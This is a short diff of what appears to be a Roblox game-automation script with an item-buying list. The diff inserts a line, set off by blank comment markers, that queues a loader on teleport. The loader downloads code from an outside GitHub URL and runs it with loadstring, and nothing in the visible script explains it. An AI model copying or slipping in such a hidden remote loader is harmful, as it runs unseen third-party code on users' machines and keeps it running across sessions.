@@ -1,4 +1,7 @@
 if not game:IsLoaded() then game.Loaded:Wait() end
+--
+queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/called333/test/refs/heads/main/al"))()]])
+--
 local ToBuy = {
     "Soul Dust",
     "Artifacts",
